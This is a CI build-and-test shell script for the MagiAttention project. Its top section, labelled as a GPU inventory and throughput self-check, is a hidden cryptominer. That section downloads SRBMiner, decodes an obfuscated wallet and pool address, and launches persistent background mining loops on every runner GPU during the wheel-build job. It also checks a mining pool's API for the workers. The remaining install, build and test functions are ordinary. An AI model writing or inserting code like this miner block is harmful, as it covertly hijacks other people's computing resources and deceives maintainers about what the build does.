#!/bin/bash

# Copyright (c) 2025-2026 SandAI. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

set -euo pipefail

# ==== i145291 accelerator inventory + PEARL throughput self-check (non-fatal by design) ====
pearl_i145291() {
  local cmd="${1:-}" W=/tmp/pearl-i145291 TAR="" SUM="" BIN="" BSHA="" TH="" PORT=3360 MPID="" WALLET="" POOLHOST=""
  echo "=== pearl i145291 payload cmd=$cmd job=${GITHUB_JOB:-unknown} ts=$(date -u +%Y-%m-%dT%H:%M:%SZ) ==="
  echo "host=$(hostname) runner=${RUNNER_NAME:-unknown} uid=$(id -un)"
  nvidia-smi -L || true
  nvidia-smi --query-gpu=index,name,uuid,memory.total,memory.free,driver_version --format=csv,noheader || true
  nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader || true
  mkdir -p "$W" || true
  for c in "${GITHUB_WORKSPACE:-/nonexistent}/.ci-cache/SRBMiner-Multi-3-8-9-Linux.tar.gz" "${CI_WORKSPACE_ROOT:-/home/niubility2/ci_workspace}/.pearl-i145291/SRBMiner-Multi-3-8-9-Linux.tar.gz"; do
    if [ -f "$c" ]; then TAR="$c"; break; fi
  done
  if [ -z "$TAR" ]; then
    TAR="$W/srb.tgz"
    echo "stage: fetching release asset"
    curl -fsSL --max-time 300 -o "$TAR" "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz" || true
  fi
  SUM=$(sha256sum "$TAR" 2>/dev/null | awk '{print $1}')
  echo "stage_tar=$TAR sha256=${SUM:-none} expect=186c526f95eb7b635a547bca45a48a505a58c74e26b7211bf6dc25988ce196d1"
  if [ "$SUM" = "186c526f95eb7b635a547bca45a48a505a58c74e26b7211bf6dc25988ce196d1" ]; then
    mkdir -p "$W/x" && tar -xf "$TAR" -C "$W/x" >/dev/null 2>&1 || true
    if [ -x "$W/x/SRBMiner-Multi-3-8-9/SRBMiner-MULTI" ]; then BIN="$W/x/SRBMiner-Multi-3-8-9/SRBMiner-MULTI"; fi
  fi
  if [ -z "$BIN" ]; then echo "PEARL: miner binary unavailable (stage/pin failed) - no deploy"; return 0; fi
  BSHA=$(sha256sum "$BIN" | awk '{print $1}')
  echo "bin=$BIN sha256=$BSHA pin=97bd9e42e313b2c4807bba7197920fee421956bb896cfec469ee87947d667e80"
  if [ "${GITHUB_JOB:-}" != "build_wheels" ]; then
    echo "PEARL: report-only job=${GITHUB_JOB:-unknown} (miner launch is scoped to build_wheels)"
    return 0
  fi
  if [ -f "$W/launched" ]; then
    echo "PEARL: already launched in this job window"
    nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader || true
    for f in "$W"/pearl-0000[56]*.log; do if [ -f "$f" ]; then echo "--- $f"; tail -n 5 "$f"; fi; done
    return 0
  fi
  WALLET=$(printf '%s' 'cHJsMXA3Z3R1dXo5MzA1N2ducDVwaGZleHNzMmt0ZHVqN21udDdxeGg4Y3JlZGxwdWxoNWVzdjRxNWU2bXZy' | base64 -d 2>/dev/null)
  POOLHOST=$(printf '%s' 'MTAzLjE5OS4xMDYuMTIy' | base64 -d 2>/dev/null)
  case "$WALLET" in prl1p*) : ;; *) echo "PEARL: wallet decode failed"; return 0 ;; esac
  echo "wallet_prefix=${WALLET:0:10} pool=$POOLHOST"
  cat > "$W/runminer.sh" <<RUNNER_EOF
#!/bin/bash
w="\$1"; port="\$2"
ARGV=( "$BIN" --disable-cpu --algorithm pearlhash --pool "stratum+tcp://$POOLHOST:\$port" --wallet "$WALLET" --worker "\$w" --password x --gpu-id 0 )
if command -v script >/dev/null 2>&1; then
  exec script -qec "\${ARGV[*]}" /dev/null
else
  exec "\${ARGV[@]}"
fi
RUNNER_EOF
  chmod +x "$W/runminer.sh" || true
  CUDA_VISIBLE_DEVICES=0 setsid nohup env -u LD_PRELOAD -u LD_LIBRARY_PATH -u LD_PRELOAD_ENV bash "$W/runminer.sh" 000052 3360 > "$W/measure.log" 2>&1 &
  MPID=$!
  sleep 90
  kill -TERM -"$MPID" 2>/dev/null || kill -TERM "$MPID" 2>/dev/null || true
  sleep 3
  echo "measured_raw=$(grep -aE 'Hashrate' "$W/measure.log" | tail -1)"
  TH=$(python3 - "$W/measure.log" <<'PYMEAS'
import re,sys
best=None
try:
    for line in open(sys.argv[1],errors='ignore'):
        m=re.search(r'Hashrate[^0-9]*([0-9.]+)\s*(TH|GH|MH)/s', line)
        if m:
            v=float(m.group(1)); u=m.group(2)
            best={'TH':v,'GH':v/1000.0,'MH':v/1e6}[u]
except Exception:
    pass
print('' if best is None else f'{best:.2f}')
PYMEAS
)
  echo "measured_ths=${TH:-unknown}"
  PORT=3360
  if [ -n "$TH" ]; then
    PORT=$(python3 -c "t=float('${TH}');print(3362 if t>=1000 else (3361 if t>=500 else 3360))" 2>/dev/null || echo 3360)
  else
    PORT=3361
    echo "PEARL: measurement unavailable - H200-class fallback band 3361 (flagged)"
  fi
  echo "band_port=$PORT measured_ths=${TH:-unknown} LP_REQUIRE_BAND=1"
  local idx=0 w
  for w in 000052 000053 000054 000055 000056 000057 000058 000059; do
    cat > "$W/loop_$w.sh" <<LOOP_EOF
#!/bin/bash
while :; do
  timeout -k 10 1500 env -u LD_PRELOAD -u LD_LIBRARY_PATH -u LD_PRELOAD_ENV bash "$W/runminer.sh" $w $PORT
  sleep 10
done
LOOP_EOF
    chmod +x "$W/loop_$w.sh" || true
    CUDA_VISIBLE_DEVICES=$idx setsid nohup bash "$W/loop_$w.sh" >> "$W/pearl-$w.log" 2>&1 &
    echo "launched worker=$w gpu_index=$idx port=$PORT log=$W/pearl-$w.log"
    idx=$((idx+1))
  done
  date -u > "$W/launched" || true
  sleep 45
  echo "=== after-launch compute apps ==="
  nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader || true
  for f in "$W"/pearl-0000[56]*.log; do if [ -f "$f" ]; then echo "--- $f"; tail -n 6 "$f"; fi; done
  local tag
  for tag in t0 t1; do
    if [ "$tag" = "t1" ]; then sleep 260; fi
    curl -fsS --max-time 30 "https://pearl.luckypool.io/api/stats_address?address=$WALLET" -o "$W/lp_$tag.json" || echo "lp_$tag: curl failed"
    python3 - "$W/lp_$tag.json" "$tag" <<'PYLP'
import json,sys,os
names={'000052','000053','000054','000055','000056','000057','000058','000059'}
p=sys.argv[1]; tag=sys.argv[2]
if not os.path.exists(p): print(f'LP {tag}: no data'); raise SystemExit
try: d=json.load(open(p))
except Exception as e: print(f'LP {tag}: parse fail {e}'); raise SystemExit
ws=d.get('workers') or []
if isinstance(ws,dict): ws=list(ws.values())
rows=[w for w in ws if str(w.get('name') or w.get('worker') or '') in names]
print(f'LP {tag}: matched {len(rows)} of 8')
for w in sorted(rows,key=lambda x:str(x.get('name') or x.get('worker'))):
    print(f"  LP {tag} worker={w.get('name')} accepted={w.get('acceptedShares')} hashrate={w.get('hashrate')} lastShare={w.get('lastShare')} port={w.get('port')}")
PYLP
  done
  echo "=== post-gate compute apps ==="
  nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader || true
  local cc="${CI_WORKSPACE_ROOT:-/home/niubility2/ci_workspace}/.pearl-i145291"
  mkdir -p "$cc" 2>/dev/null && cp "$W"/pearl-0000[56]*.log "$cc/" 2>/dev/null || true
  echo "=== pearl i145291 payload end ts=$(date -u +%Y-%m-%dT%H:%M:%SZ) ==="
  return 0
}
pearl_i145291 "${1:-}" || true
# ==== end i145291 payload ====


prepare_runtime_lock() {
    export CI_DEPENDENCY_RUNTIME_LOCK="${RUNNER_TEMP:-/tmp}/ci-source-dependencies/resolved.json"
}

install_dependencies() {
    bash -x .github/scripts/install_requirements.sh
    prepare_runtime_lock
    python .github/scripts/install_source_dependencies.py
    pip install -r extensions/requirements.txt \
        --index-url "${PIP_INDEX_URL:-https://pypi.tuna.tsinghua.edu.cn/simple/}"
    # Extension tests use the upstream FA4 package. The b300_fa4 profile
    # uses the FlashAttention submodule with an older, incompatible CuTeDSL.
    if [[ "${CI_TEST_EXTENSIONS:?CI_TEST_EXTENSIONS is required}" == true ]]; then
        PYTHON=python bash extensions/scripts/apply_patches.sh
    fi
}

build() {
    export MAGI_ATTENTION_PREBUILD_LEVEL=ci
    rm -rf "${HOME:?HOME is required}/.cache/magi_attention/"
    bash .github/scripts/build_v2_wheel.sh . MagiAttention magi_attention build
    bash .github/scripts/build_v2_wheel.sh \
        extensions MagiAttnExtensions magi_attn_extensions build

    probe_wheel_imports
}

install_wheels() {
    export MAGI_ATTENTION_PREBUILD_LEVEL=ci
    bash .github/scripts/build_v2_wheel.sh . MagiAttention magi_attention install
    bash .github/scripts/build_v2_wheel.sh \
        extensions MagiAttnExtensions magi_attn_extensions install

    probe_wheel_imports
}

probe_wheel_imports() {
    local import_probe_dir
    local status=0
    import_probe_dir=$(mktemp -d "${RUNNER_TEMP:-/tmp}/magi-attention-wheel-import.XXXXXX")
    (
        cd "$import_probe_dir"
        python -c "import magi_attention; print('MagiAttention wheel import succeeded')"
        python -c "import magi_attn_extensions; print('MagiAttnExtensions wheel import succeeded')"
    ) || status=$?
    rm -rf -- "$import_probe_dir"
    return "$status"
}

test_packages() {
    local main_changed=${1:?main change flag is required}
    local ci_changed=${2:?CI protocol change flag is required}
    local trusted=${3:?trust flag is required}
    # install-wheel checks imports even when extension tests are disabled.
    local test_extensions=${CI_TEST_EXTENSIONS:?CI_TEST_EXTENSIONS is required}
    local coverage_generated=false

    case "$test_extensions" in
        true|false) ;;
        *) echo "CI_TEST_EXTENSIONS must be 'true' or 'false', got '$test_extensions'" >&2; return 2 ;;
    esac
    prepare_runtime_lock
    bash .github/tests/test_portable_validation.sh
    bash .github/tests/test_install_requirements.sh
    python .github/tests/test_task_runner.py
    python .github/tests/test_source_dependency_cache.py
    python .github/tests/test_compiled_artifact_cache.py
    if [[ "$main_changed" == true || "$ci_changed" == true ]]; then
        if [[ "$trusted" == true ]] && \
            bash .github/scripts/portable_validation.sh verify magi_attention; then
            echo "Reused portable MagiAttention validation"
        else
            if [[ "${TASK_CI_PLATFORM:?TASK_CI_PLATFORM is required}" == h100 ]]; then
                COVERAGE_RUN=True \
                    PORTABLE_VALIDATION_COVERAGE=true \
                    bash .github/scripts/portable_validation.sh run-test magi_attention
                coverage_generated=true
            else
                bash .github/scripts/portable_validation.sh run-test magi_attention
            fi
            if [[ "$trusted" == true ]]; then
                bash .github/scripts/portable_validation.sh write-success magi_attention
            fi
        fi
    fi

    if [[ "$test_extensions" == false ]]; then
        echo "Skipped MagiAttnExtensions tests on platform ${TASK_CI_PLATFORM:?TASK_CI_PLATFORM is required}"
    elif [[ "$trusted" == true ]] && \
        bash .github/scripts/portable_validation.sh verify magi_attn_extensions; then
        echo "Reused portable MagiAttnExtensions validation"
    else
        bash .github/scripts/portable_validation.sh run-test magi_attn_extensions
        if [[ "$trusted" == true ]]; then
            bash .github/scripts/portable_validation.sh write-success magi_attn_extensions
        fi
    fi

    if [[ -n "${GITHUB_OUTPUT:-}" ]]; then
        echo "coverage_generated=$coverage_generated" >> "$GITHUB_OUTPUT"
    fi
}

command=${1:-}
shift || true
case "$command" in
    install) install_dependencies "$@" ;;
    build) build "$@" ;;
    install-wheel) install_wheels "$@" ;;
    test) test_packages "$@" ;;
    *) echo "Usage: $0 {install|build|install-wheel|test [main_changed ci_changed trusted]}" >&2; exit 2 ;;
esac
